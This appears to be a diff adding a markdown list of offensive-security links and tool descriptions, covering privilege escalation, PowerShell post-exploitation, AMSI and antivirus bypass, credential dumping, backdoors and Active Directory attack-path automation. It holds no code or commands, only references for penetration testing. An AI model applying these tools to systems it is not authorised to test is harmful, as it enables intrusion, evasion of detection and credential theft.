+* [BSidesSF 109 Sedating the Watchdog Abusing Security Products to Bypass Windows Protections Tomer Bit](https://www.youtube.com/watch?v=7RKHux8QJfU)
+* [Black hat talk on Windows Privilege Escalation](http://www.slideshare.net/riyazwalikar/windows-privilege-escalation)
+* [Level Up! - Practical Windows Privilege Escalation](https://www.slideshare.net/jakx_/level-up-practical-windows-privilege-escalation)
+* [Extreme Privelege Escalataion on Windows8 UEFI Systems](https://www.youtube.com/watch?v=UJp_rMwdyyI)
+* [Slides](https://www.blackhat.com/docs/us-14/materials/us-14-Kallenberg-Extreme-Privilege-Escalation-On-Windows8-UEFI-Systems.pdf)
+
+  * Summary by stormehh from reddit: “In this whitepaper (and accompanying
+    Defcon/Blackhat presentations), the authors demonstrate vulnerabilities in
+    the UEFI "Runtime Service" interface accessible by a privileged userland
+    process on Windows 8. This paper steps through the exploitation process in
+    great detail and demonstrates the ability to obtain code execution in SMM
+    and maintain persistence by means of overwriting SPI flash”
+
+* [The Travelling Pentester: Diaries of the Shortest Path to Compromise](https://www.slideshare.net/harmj0y/the-travelling-pentester-diaries-of-the-shortest-path-to-compromise)
+* [Windows Privilege Escalation - Riyaz Walikar](https://www.slideshare.net/riyazwalikar/windows-privilege-escalation)
+
+#### Tools
+
+* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
+
+  * [Blogpost](https://blog.gdssecurity.com/labs/2014/7/11/introducing-windows-exploit-suggester.html)
+  * This tool compares a targets patch levels against the Microsoft
+    vulnerability database in order to detect potential missing patches on the
+    target. It also notifies the user if there are public exploits and
+    Metasploit modules available for the missing bulletins.
+
+* [PowerUp](https://n0where.net/windows-local-privilege-escalation-powerup/)
+
+  * Windows Privilege Escalation through Powershell
+
+* [ElevateKit](https://github.com/rsmudge/ElevateKit)
+
+  * The Elevate Kit demonstrates how to use third-party privilege escalation
+    attacks with Cobalt Strike's Beacon payload.
+
+* [kernelpop](https://github.com/spencerdodd/kernelpop)
+
+  * kernel privilege escalation enumeration and exploitation framework
+
+* [BeRoot](https://github.com/AlessandroZ/BeRoot)
+* [Pompem](https://github.com/rfunix/Pompem)
+
+  * Pompem is an open source tool, designed to automate the search for Exploits
+    and Vulnerability in the most important databases. Developed in Python, has
+    a system of advanced search, that help the work of pentesters and ethical
+    hackers. In the current version, it performs searches in PacketStorm
+    security, CXSecurity, ZeroDay, Vulners, National Vulnerability Database,
+    WPScan Vulnerability Database
+
+#### Misc Privilege Escalation
+
+* [dtappgather-poc.sh](https://github.com/HackerFantastic/Public/blob/master/exploits/dtappgather-poc.sh)
+
+  * Exploit PoC reverse engineered from EXTREMEPARR which provides local root on
+    Solaris 7 - 11 (x86 & SPARC). Uses a environment variable of setuid binary
+    dtappgather to manipulate file permissions and create a user owned directory
+    anywhere on the system (as root). Can then add a shared object to locale
+    folder and run setuid binaries with an untrusted library file.
+
+* [Privilege Escalation Using Keepnote](http://0xthem.blogspot.com/2014/05/late-night-privilege-escalation-keepup.html)
+
+### Powershell Things
+
+* [Empire](https://github.com/EmpireProject/Empire)
+
+  * Empire is a post-exploitation framework that includes a pure-PowerShell2.0
+    Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge
+    of the previous PowerShell Empire and Python EmPyre projects. The framework
+    offers cryptologically-secure communications and a flexible architecture. On
+    the PowerShell side, Empire implements the ability to run PowerShell agents
+    without needing powershell.exe, rapidly deployable post-exploitation modules
+    ranging from key loggers to Mimikatz, and adaptable communications to evade
+    network detection, all wrapped up in a usability-focused framework.
+    PowerShell Empire premiered at BSidesLV in 2015 and Python EmPyre premeiered
+    at HackMiami 2016.
+
+* [Koadic](https://github.com/zerosum0x0/koadic)
+
+  * Koadic, or COM Command & Control, is a Windows post-exploitation rootkit
+    similar to other penetration testing tools such as Meterpreter and
+    Powershell Empire. The major difference is that Koadic does most of its
+    operations using Windows Script Host (a.k.a. JScript/VBScript), with
+    compatibility in the core to support a default installation of Windows 2000
+    with no service packs (and potentially even versions of NT4) all the way
+    through Windows 10.
+
+* [Get-Help: An Intro to PowerShell and How to Use it for Evil - Jared Haight](https://www.psattack.com/presentations/get-help-an-intro-to-powershell-and-how-to-use-it-for-evil/)
+* [PowerOPS: PowerShell for Offensive Operations](https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/)
+  * [PowerOPS Github page](https://github.com/fdiskyou/PowerOPS)
+* [Client Side attacks using Powershell](http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html)
+* [Dirty Powershell Webserver](http://obscuresecurity.blogspot.com/2014/05/dirty-powershell-webserver.html)
+* [Brosec](https://github.com/gabemarshall/Brosec)
+
+  * Brosec is a terminal based reference utility designed to help us infosec
+    bros and broettes with usefuPowershelll (yet sometimes complex) payloads and
+    commands that are often used during work as infosec practitioners. An
+    example of one of Brosec's most popular use cases is the ability to generate
+    on the fly reverse shells (python, perl, powershell, etc) that get copied to
+    the clipboard.
+
+* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell/tree/master)
+* [ps1-toolkit](https://github.com/vysec/ps1-toolkit)
+
+  * This is a set of PowerShell scripts that are used by many penetration
+    testers released by multiple leading professionals. This is simply a
+    collection of scripts that are prepared and obfuscated to reduce level of
+    detectability and to slow down incident response from understanding the
+    actions performed by an attacker.
+
+### Awareness
+
+* [Veil-PowerView](https://github.com/Veil-Framework/Veil-PowerView)
+
+  * Veil-PowerView is a powershell tool to gain network situational awareness on
+    Windows domains. It contains a set of pure-powershell replacements for
+    various windows "net \_" commands, which utilize powershell AD hooks and
+    underlying Win32 API functions to perform useful Windows domain
+    functionality.
+
+* [PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)
+
+  * AD PowerShell Recon Scripts
+
+### Active Directory
+
+* [Find AD users with empty password using PowerShell](https://4sysops.com/archives/find-ad-users-with-empty-password-passwd_notreqd-flag-using-powershell/)
+* [LDAPDomainDump](https://github.com/dirkjanm/ldapdomaindump)
+
+  * In an Active Directory domain, a lot of interesting information can be
+    retrieved via LDAP by any authenticated user (or machine). This makes LDAP
+    an interesting protocol for gathering information in the recon phase of a
+    pentest of an internal network. A problem is that data from LDAP often is
+    not available in an easy to read format. ldapdomaindump is a tool which aims
+    to solve this problem, by collecting and parsing information available via
+    LDAP and outputting it in a human readable HTML format, as well as machine
+    readable json and csv/tsv/greppable files.
+
+* [ACLight](https://github.com/cyberark/ACLight)
+
+  * The tool queries the Active Directory (AD) for its objects' ACLs and then
+    filters and analyzes the sensitive permissions of each one. The result is a
+    list of domain privileged accounts in the network (from the advanced ACLs
+    perspective of the AD). You can run the scan with just any regular user
+    (could be non-privileged user) and it automatically scans all the domains of
+    the scanned network forest.
+
+* [MailSniper](https://github.com/dafthack/MailSniper)
+
+  * MailSniper is a penetration testing tool for searching through email in a
+    Microsoft Exchange environment for specific terms (passwords, insider intel,
+    network architecture information, etc.). It can be used as a
+    non-administrative user to search their own email, or by an Exchange
+    administrator to search the mailboxes of every user in a domain. MailSniper
+    also includes additional modules for password spraying, enumerating
+    users/domains, gathering the Global Address List from OWA and EWS, and
+    checking mailbox permissions for every Exchange user at an organization. \_
+
+* [I hunt sys admins 2.0](https://web.archive.org/web/20161101051834/http://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
+* [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+
+  * Invoke-TheHash contains PowerShell functions for performing pass the hash
+    WMI and SMB tasks. WMI and SMB services are accessed through .NET TCPClient
+    connections. Authentication is performed by passing an NTLM hash into the
+    NTLMv2 authentication protocol. Local administrator privilege is not
+    required client-side.
+
+### AV Bypass Stuff
+
+* [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+
+  * Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and
+    script obfuscator.
+
+* [Presentation](https://www.youtube.com/watch?v=P1lkflnWb0I) \_
+* [Invoke-Obfuscation: PowerShell obfuscation Techniques & How To (Try To) detect them](http://www.irongeek.com/i.php?page=videos/derbycon6/121-invoke-obfuscation-powershell-obfusk8tion-techniques-how-to-try-to-detect-them-daniel-bohannon)
+* [Pulling Back the Curtains on EncodedCommand PowerShell Attacks](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)
+* [Invoke-CradleCrafter: Moar PowerShell obFUsk8tion by Daniel Bohannon](https://www.youtube.com/watch?feature=youtu.be&v=Nn9yJjFGXU0&app=desktop) \*
+* [Invoke-CradleCrafter v1.1](https://github.com/danielbohannon/Invoke-CradleCrafter)
+
+### Bypass Powershell Restrictions
+
+#### Articles/Videos\**
+
+* [AMSI: How Windows 10 Plans to Stop Script-Based Attacks and How Well It Does It - Blogpost](http://www.labofapenetrationtester.com/2016/09/amsi.html)
+* [AMSI: How Windows 10 Plans to Stop Script-Based Attaacks and How Well It Does It - BH US16](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
+* [15 Ways to bypass Powershell execution-policy settings](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
+* Does what it says on the tin. Overall, its clear that execution-policy was not
+  meant as a security method. Or if it was, someone was drinking a bit too much.
+* [PSAmsi - An offensive PowerShell module for interacting with the Anti-Malware Scan Interface in Windows 10](http://www.irongeek.com/i.php?page=videos/derbycon7/t104-psamsi-an-offensive-powershell-module-for-interacting-with-the-anti-malware-scan-interface-in-windows-10-ryan-cobb)
+* [Bypassing AMSI via COM Server Hijacking](https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff)
+* [PowerShell ScriptBlock Logging Bypass](https://cobbr.io/ScriptBlock-Logging-Bypass.html)
+* [Powershell without Powershell to bypass app whitelist](https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/)
+* [Empire without PowerShell.exe](https://bneg.io/2017/07/26/empire-without-powershell-exe/)
+
+#### Tools
+
+* [PSAmsi](https://github.com/cobbr/PSAmsihttps://github.com/cobbr/PSAmsi)
+
+  * PSAmsi is a tool for auditing and defeating AMSI signatures.
+
+* [nps - Not PowerShell](https://github.com/Ben0xA/nps)
+
+  * Execute powershell without powershell.exe
+
+* [nps_payload](https://github.com/trustedsec/nps_payload)
+
+  * This script will generate payloads for basic intrusion detection avoidance.
+    It utilizes publicly demonstrated techniques from several different sources.
+
+* [PowerShdll](https://github.com/p3nt4/PowerShdll)
+
+  * Run PowerShell with rundll32. Bypass software restrictions.
+
+* [p0wnedShell](https://github.com/Cn33liz/p0wnedShell)
+
+  * p0wnedShell is an offensive PowerShell host application written in C# that
+    does not rely on powershell.exe but runs powershell commands and functions
+    within a powershell runspace environment (.NET).
+
+### Dumping/Grabbing Creds
+
+* [PShell Script: Extract All GPO Set Passwords From Domain](http://www.nathanv.com/2012/07/04/pshell-script-extract-all-gpo-set-passwords-from-domain/)
+
+  * This script parses the domain’s Policies folder looking for Group.xml files.
+    These files contain either a username change, password setting, or both.
+    This gives you the raw data for local accounts and/or passwords enforced
+    using Group Policy Preferences. Microsoft chose to use a static AES key for
+    encrypting this password. How awesome is that!
+
+* [mimikittenz](https://github.com/putterpanda/mimikittenz/)
+
+  * A post-exploitation powershell tool for extracting juicy info from memory.
+
+* [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+  * Inveigh is a PowerShell LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool
+    designed to assist penetration testers/red teamers that find themselves
+    limited to a Windows system.
+
+* [PowerMemory](https://github.com/giMini/PowerMemory)
+
+  * Exploit the credentials present in files and memory. PowerMemory levers
+    Microsoft signed binaries to hack Microsoft operating systems.
+
+### Grabbing Useful files
+
+* [BrowserGatherer](https://github.com/sekirkity/BrowserGather)
+
+  * Fileless Extraction of Sensitive Browser Information with PowerShell
+
+* [SessionGopher](https://github.com/fireeye/SessionGopher)
+
+  * SessionGopher is a PowerShell tool that uses WMI to extract saved session
+    information for remote access tools such as WinSCP, PuTTY, SuperPuTTY,
+    FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
+
+* [CC_Checker](https://github.com/NetSPI/PS_CC_Checker)
+
+  * CC_Checker cracks credit card hashes with PowerShell.
+
+* [BrowserGather](https://github.com/sekirkity/BrowserGather)
+
+  * Fileless Extraction of Sensitive Browser Information with PowerShell. This
+    project will include various cmdlets for extracting credential, history, and
+    cookie/session data from the top 3 most popular web browsers (Chrome,
+    Firefox, and IE). The goal is to perform this extraction entirely in-memory,
+    without touching the disk of the victim. Currently Chrome credential and
+    cookie extraction is supported.
+
+### Malicious X (Document/Macro/whatever) Generation
+
+* [?psWar.py](https://gist.github.com/HarmJ0y/aecabdc30f4c4ef1fad3)
+
+  * Code that quickly generates a deployable .war for a PowerShell one-liner
+
+### Priv Esc / Post Ex Scripts
+
+* [PowerUp](https://github.com/HarmJ0y/PowerUp)
+
+  * PowerUp is a powershell tool to assist with local privilege escalation on
+    Windows systems. It contains several methods to identify and abuse
+    vulnerable services, as well as DLL hijacking opportunities, vulnerable
+    registry settings, and escalation opportunities.
+
+* [Sherlock](https://github.com/rasta-mouse/Sherlock/blob/master/README.md)
+
+  * PowerShell script to quickly find missing software patches for local
+    privilege escalation vulnerabilities.
+
+* [JSRat-Py](https://github.com/Hood3dRob1n/JSRat-Py)
+
+  * Implementation of JSRat.ps1 in Python so you can now run the attack server
+    from any OS instead of being limited to a Windows OS with Powershell enabled
+
+#### Talks/Videos
+
+* [PowerShell Secrets and Tactics Ben0xA ](https://www.youtube.com/watch?v=mPPv6_adTyg)
+* [Introducing PowerShell into your Arsenal with PS>Attack - Jared Haight](http://www.irongeek.com/i.php?page=videos/derbycon6/119-introducing-powershell-into-your-arsenal-with-psattack-jared-haight)
+* [Attacking ADFS Endpoints with PowerShell](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)
+* [Introducing PS Attack, a portable PowerShell attack toolkit - Jared Haight](https://www.youtube.com/watch?v=lFCtPdUPdHw)
+* [Offensive Active Directory with Powershell](https://www.youtube.com/watch?v=cXWtu-qalSs)
+* [Hacking SQL Server on Scale with PowerShell - Secure360 2017](https://www.slideshare.net/nullbind/2017-secure360-hacking-sql-server-on-scale-with-powershell)
+* [PowerLine](https://github.com/fullmetalcache/powerline)
+* [Presentation](https://www.youtube.com/watch?v=HiAtkLa8FOc)
+
+### Miscellaneous Useful Things
+
+* [Egress Testing using PowerShell](http://www.labofapenetrationtester.com/2014/04/egress-testing-using-powershell.html)
+* [PowerShell and Token Impersonation](https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/)
+* [Accessing the Windows API in PowerShell via internal .NET methods and reflection](http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html)
+
+  * It is possible to invoke Windows API function calls via internal .NET native
+    method wrappers in PowerShell without requiring P/Invoke or C# compilation.
+    How is this useful for an attacker? You can call any Windows API function
+    (exported or non-exported) entirely in memory. For those familiar with
+    Metasploit internals, think of this as an analogue to railgun.
+
+* [Invoke-DCOM.ps1](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1)
+* [Invoke-ProcessScan](https://github.com/vysec/Invoke-ProcessScan)
+
+  * Gives context to a system. Uses EQGRP shadow broker leaked list to give some
+    descriptions to processes.
+
+* [PSReflect](https://github.com/mattifestation/PSReflect)
+
+  * Easily define in-memory enums, structs, and Win32 functions in PowerShell
+
+* [Harness](https://github.com/Rich5/Harness)
+
+  * Harness is remote access payload with the ability to provide a remote
+    interactive PowerShell interface from a Windows system to virtually any TCP
+    socket. The primary goal of the Harness Project is to provide a remote
+    interface with the same capabilities and overall feel of the native
+    PowerShell executable bundled with the Windows OS.
+
+* [Babadook](https://github.com/jseidl/Babadook)
+
+  * Connection-less Powershell Persistent and Resilient Backdoor
+
+### DLL Stuff
+
+**DLL Stuff** _ [rattler](https://github.com/sensepost/rattler) _ Rattler is a
+tool that automates the identification of DLL's which can be used for DLL
+preloading attacks. _
+[injectAllTheThings](https://github.com/fdiskyou/injectAllTheThings) _ Single
+Visual Studio project implementing multiple DLL injection techniques (actually 7
+different techniques) that work both for 32 and 64 bits. Each technique has its
+own source code file to make it easy way to read and understand.
+
+### DLL Hijacking
+
+* [Dynamic-Link Library Hijacking](https://www.exploit-db.com/docs/31687.pdf)
+* [Crash Course in DLL Hijacking](https://blog.fortinet.com/2015/12/10/a-crash-course-in-dll-hijacking)
+* [DLL Injection and Hooking](http://securityxploded.com/dll-injection-and-hooking.php)
+* [Windows DLL Injection Basics](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html)
+* [VB.NET Tutorial - Create a DLL / Class Library](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)
+* [Calling DLL Functions from Visual Basic Applications - msdn](https://msdn.microsoft.com/en-us/library/dt232c9t.aspx)
+* [Crash Course in DLL Hijacking](https://blog.fortinet.com/2015/12/10/a-crash-course-in-dll-hijacking)
+* [Creating a Windows DLL with Visual Basic](http://www.windowsdevcenter.com/pub/a/windows/2005/04/26/create_dll.html)
+
+### Group Policy Preferences trick
+
+* [1](http://www.leonteale.co.uk/decrypting-windows-2008-gpp-user-passwords-using-gpprefdecrypt-py/)
+* [2](http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html)
+* [3](http://blog.securestate.com/how-to-pwn-systems-through-group-policy-preferences/)
+
+### Privilege Escalation - OS X
+
+### OS X Privilege Escalation
+
+* [Hidden backdoor API to root privileges in Apple OS X](https://truesecdev.wordpress.com/2015/04/09/hidden-backdoor-api-to-root-privileges-in-apple-os-x/)
+
+  * Works on 10.7 -> 10.10.2
+
+* [Mac OS X local privilege escalation (IOBluetoothFamily)](http://randomthoughts.greyhats.it/2014/10/osx-local-privilege-escalation.html)
+* [Privilege Escalation on OS X below 10.0](https://code.google.com/p/google-security-research/issues/detail?id=121)
+* [Hacking Mac With EmPyre](http://www.disinfosec.com/2016/10/12/hacking-mac/)
+* [osxinj](https://github.com/scen/osxinj)
+
+  * Another dylib injector. Uses a bootstrapping module since mach_inject
+    doesn't fully emulate library loading and crashes when loading complex
+    modules.
+
+* [kcap](https://github.com/scriptjunkie/kcap)
+
+* This program simply uses screen captures and programmatically generated key
+  and mouse events to locally and graphically man-in-the-middle an OS X password
+  prompt to escalate privileges.
+
+* [BigPhish](https://github.com/Psychotrope37/bigphish)
+
+  * This issue has been resolved by Apple in MacOS Sierra by enabling
+    tty_tickets by default. NOTE: All other MacOS operation system (El Capitan,
+    Yosemite, Mavericks etc...) still remain vulnerable to this exploit.
+
+### General Post Exploitation
+
+* [Adversarial Post Ex - Lessons from the Pros](https://www.slideshare.net/sixdub/adversarial-post-ex-lessons-from-the-pros)
+* [portia](https://github.com/SpiderLabs/portia)
+
+  * Portia aims to automate a number of techniques commonly performed on
+    internal network penetration tests after a low privileged account has been
+    compromised.
+
+* [Meta-Post Exploitation - Using Old, Lost, Forgotten Knowledge](https://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf)
+* [dvcs-ripper](https://github.com/kost/dvcs-ripper)
+
+  * Rip web accessible (distributed) version control systems: SVN, GIT,
+    Mercurial/hg, bzr, ... It can rip repositories even when directory browsing
+    is turned off.
+
+### Post-Exploitation Linux
+
+**Post-Exploitation Linux**
+
+* [More on Using Bash's Built-in /dev/tcp File
+  (TCP/IP)](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip
+
+  * More on Using Bash's Built-in /dev/tcp File (TCP/IP))
+
+### Post-Exploitation Windows
+
+**Post-Exploitation Windows**
+
+* [Dumping user passwords in plaintext on Windows 8.1 and Server 2012](http://www.labofapenetrationtester.com/2015/05/dumping-passwords-in-plain-on-windows-8-1.html)
+* [Post-Exploitation on Windows using ActiveX Controls](http://uninformed.org/?v=all&a=3&t=sumry)
+* [WMI Shell Tool](https://github.com/secabstraction/Create-WMIshell)
+
+  * The WMI shell tool that we have developed allows us to execute commands and
+    get their output using only the WMI infrastructure, without any help from
+    other services, like the SMB server. With the wmi-shell tool we can execute
+    commands, upload files and recover Windows passwords remotely using only the
+    WMI service available on port 135.
+
+* [Windows - Application Shims](https://technet.microsoft.com/en-us/library/dd837644%28v=ws.10%29.aspx)
+* [WMIcmd](https://github.com/nccgroup/WMIcmd) \* A command shell wrapper using
+  only WMI for Microsoft Windows
+* [Windows Driver and Service enumeration with Python](https://cybersyndicates.com/2015/09/windows-driver-and-service-enumeration-with-python/)
+* [Post Exploitation Persistence With Application Shims (Intro)](http://blacksunhackers.club/2016/08/post-exploitation-persistence-with-application-shims-intro/)
+* [Shimming for Post Exploitation(blog)](http://www.sdb.tools/)
+* [Hiding Files by Exploiting Spaces in Windows Paths](http://blakhal0.blogspot.com/2012/08/hiding-files-by-exploiting-spaces-in.html)
+
+### Active Directory
+
+**Active Directory**
+
+* [What is Active Directory Domain Services and how does it work?](https://serverfault.com/questions/402580/what-is-active-directory-domain-services-and-how-does-it-work#)
+* [5 Ways to Find Systems Running Domain Admin Processes](https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/)
+
+### Blogposts/Writeups
+
+* [How To Pass the Ticket Through SSH Tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
+* [Accessing Internal Fileshares through Exchange ActiveSync](https://labs.mwrinfosecurity.com/blog/accessing-internal-fileshares-through-exchange-activesync)
+* [Pen Testing Active Directory Series](https://blog.varonis.com/binge-read-pen-testing-active-directory-series/)
+* [How Attackers Dump Active Directory Database Credentials](https://adsecurity.org/?p=2398)
+* [Nodal Analysis of Domain Trusts – Maximizing the Win!](http://www.sixdub.net/?p=285)
+* [Derivative Local Admin](https://web.archive.org/web/20170606071124/https://www.sixdub.net/?p=591)
+* [Faster Domain Escalation using LDAP ](https://blog.netspi.com/faster-domain-escalation-using-ldap/)
+* [Abusing DNSAdmins privilege for escalation in Active Directory](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+* [Hacking SQL Server on Scale with PowerShell - Secure360 2017](https://www.slideshare.net/nullbind/2017-secure360-hacking-sql-server-on-scale-with-powershell)
+
+### Talks/Videos
+
+* [Automating the Empire with the Death Star: getting Domain Admin with a push of a button](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html)
+* [Offensive Active Directory with Powershell](https://www.youtube.com/watch?v=cXWtu-qalSs)
+* [Abusing Active Directory in Post-Exploitation](https://www.irongeek.com/i.php?page=videos/derbycon4/t105-abusing-active-directory-in-post-exploitation-carlos-perez)
+
+  * Windows APIs are often a blackbox with poor documentation, taking input and
+    spewing output with little visibility on what actually happens in the
+    background. By reverse engineering (and abusing) some of these seemingly
+    benign APIs, we can effectively manipulate Windows into performing stealthy
+    custom attacks using previously unknown persistent and injection techniques.
+    In this talk, we’ll get Windows to play with itself nonstop while revealing
+    0day persistence, previously unknown DLL injection techniques, and Windows
+    API tips and tricks. To top it all off, a custom HTTP beaconing backdoor
+    will be released leveraging the newly released persistence and injection
+    techniques. So much Windows abuse, so little time.
+
+* [Advanced Targeted Attack. PoC Golden Ticket Attack - BSides Tampa 17](https://www.irongeek.com/i.php?page=videos/bsidestampa2017/102-advanced-targeted-attack-andy-thompson)
+* [“I Hunt Sys Admins”](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
+* [I Hunt Sysadmins 2.0](http://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)
+
+  * It covers various ways to hunt for users in Windows domains, including using
+    PowerView.
+
+* [Beyond the MCSE: Red Teaming Active Directory](https://www.youtube.com/watch?v=tEfwmReo1Hk)
+* [Red vs Blue: Modern Active Directory Attacks & Defense - Defcon23](https://www.youtube.com/watch?v=rknpKIxT7NM)
+* [Red Vs. Blue: Modern Active Directory Attacks, Detection, And Protection - BHUSA15](https://www.youtube.com/watch?v=b6GUXerE9Ac)
+* [Abusing Active Directory in Post Exploitation - Carlos Perez - Derbycon 4](https://www.youtube.com/watch?v=sTU-70dD-Ok)
+* [Requiem For An Admin, Walter Legowski (@SadProcessor) - BSides Amsterdam 2017](https://www.youtube.com/watch?v=uMg18TvLAcE&index=3&list=PLwZycuzv10iLBFwRIWNAR-s4iuuUMRuEB)
+
+  * Orchestrating BloodHound and Empire for Automated AD Post-Exploitation.
+    Lateral Movement and Privilege Escalation are two of the main steps in the
+    Active Directory attacker kill- chain. Applying the 'assume breach'
+    mentality, more and more companies are asking for red-teaming type of
+    assessments, and security researcher have therefor developed a wide range of
+    open-source tools to assist them during these engagements. Out of these, two
+    have quickly gained a solid reputation: PowerShell Empire and BloodHound
+    (Both by @Harmj0y & ex-ATD Crew). In this Session, I will be presenting
+    DogStrike, a new tool (PowerShell Modules) made to interface Empire &
+    BloodHound, allowing penetration testers to merge their Empire
+    infrastructure into the bloodhound graph database. Doing so allows the
+    operator to request a bloodhound path that is 'Agent Aware', and makes it
+    possible to automate the entire kill chain, from initial foothold to DA - or
+    any desired part of an attacker's routine. Presentation will be demo-driven.
+    Code for the module will be made public after the presentation. Automation
+    of Active Directory post-exploitation is going to happen sooner than you
+    might think. (Other tools are being released with the same goal*). Is it a
+    good thing? Is it a bad thing? If I do not run out of time, I would like to
+    finish the presentation by opening the discussion with the audience and see
+    what the consequences of automated post- exploitation could mean, from the
+    red, the blue or any other point of view... *: DeathStar by @Byt3Bl33d3r |
+    GoFetch by @TalTheMaor.
+
+#### Tools
+
+* [Windows Vault Password Dumper](http://www.oxid.it/downloads/vaultdump.txt) \_
+
+  * The following code shows how to use native undocumented functions of Windows
+    Vault API to enumerate and extract credentials stored by Microsoft Windows
+    Vault. The code has been successfully tested on Windows7 and Windows8
+    operating systems.
+
+* [DeathStar](https://github.com/byt3bl33d3r/DeathStar)
+
+  * DeathStar is a Python script that uses Empire's RESTful API to automate
+    gaining Domain Admin rights in Active Directory environments using a variety
+    of techinques.
+
+* [pywerview](https://github.com/the-useless-one/pywerview)
+
+  * A (partial) Python rewriting of PowerSploit's PowerView
+
+* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+  * BloodHound is a single page Javascript web application, built on top of
+    Linkurious, compiled with Electron, with a Neo4j database fed by a
+    PowerShell ingestor. BloodHound uses graph theory to reveal the hidden and
+    often unintended relationships within an Active Directory environment.
+    Attackers can use BloodHound to easily identify highly complex attack paths
+    that would otherwise be impossible to quickly identify. Defenders can use
+    BloodHound to identify and eliminate those same attack paths. Both blue and
+    red teams can use BloodHound to easily gain a deeper understanding of
+    privilege relationships in an Active Directory environment.
+
+* [My First Go with BloodHound](https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/)
+* [Lay of the Land with BloodHound](http://threat.tevora.com/lay-of-the-land-with-bloodhound/)
+* [ANGRYPUPPY](https://github.com/vysec/ANGRYPUPPY)
+
+  * Bloodhound Attack Path Execution for Cobalt Strike
+
+* [AutoRuns PowerShell Module](https://github.com/p0w3rsh3ll/AutoRuns)
+
+  * AutoRuns module was designed to help do live incident response and enumerate
+    autoruns artifacts that may be used by legitimate programs as well as
+    malware to achieve persistence.
+
+* [DomainTrustExplorer](https://github.com/sixdub/DomainTrustExplorer)
+
+  * Python script for analyis of the "Trust.csv" file generated by Veil
+    PowerView. Provides graph based analysis and output.
+
+* [GoFetch](https://github.com/GoFetchAD/GoFetch)
+
+  * GoFetch is a tool to automatically exercise an attack plan generated by the
+    BloodHound application. GoFetch first loads a path of local admin users and
+    computers generated by BloodHound and converts it to its own attack plan
+    format. Once the attack plan is ready, GoFetch advances towards the
+    destination according to plan step by step, by successively applying remote
+    code execution techniques and compromising credentials with Mimikatz.
+
+* [Invoke-HostRecon](https://github.com/dafthack/HostRecon)
+
+  * This function runs a number of checks on a system to help provide
+    situational awareness to a penetration tester during the reconnaissance
+    phase. It gathers information about the local system, users, and domain
+    information. It does not use any 'net', 'ipconfig', 'whoami', 'netstat', or
+    other system commands to help avoid detection.
+
+* [Invoke-ProcessScan](https://github.com/vysec/Invoke-ProcessScan)
+
+  * Gives context to a system. Uses EQGRP shadow broker leaked list to give some
+    descriptions to processes.
+
+* [Invoke-VNC](https://github.com/artkond/Invoke-Vnc)
+
+  * Powershell VNC injector
+
+* [knit_brute.sh](https://gist.github.com/ropnop/8711392d5e1d9a0ba533705f7f4f455f)
+
+  * A quick tool to bruteforce an AD user's password by requesting TGTs from the
+    Domain Controller with 'kinit'
+
+* [LyncSniper](https://github.com/mdsecresearch/LyncSniper)
+
+  * A tool for penetration testing Skype for Business and Lync deployments
+
+* [Blogpost/Writeup](https://www.mdsec.co.uk/2017/04/penetration-testing-skype-for-business-exploiting-the-missing-lync/)
+* [PyKEK](https://github.com/bidord/pykek)
+
+  * PyKEK (Python Kerberos Exploitation Kit), a python library to manipulate
+    KRB5-related data. (Still in development)
+
+* [SessionGopher](https://github.com/fireeye/SessionGopher)
+
+  * SessionGopher is a PowerShell tool that uses WMI to extract saved session
+    information for remote access tools such as WinSCP, PuTTY, SuperPuTTY,
+    FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally.
+
+* [7Zip4Powershell](https://github.com/thoemmi/7Zip4Powershell)
+
+  * Powershell module for creating and extracting 7-Zip archives
+
+### Office Macros
+
+### Office Macros
+
+* 101
+
+  * [Getting Started with VBA in Office](https://msdn.microsoft.com/en-us/vba/office-shared-vba/articles/getting-started-with-vba-in-office)
+
+* General
+
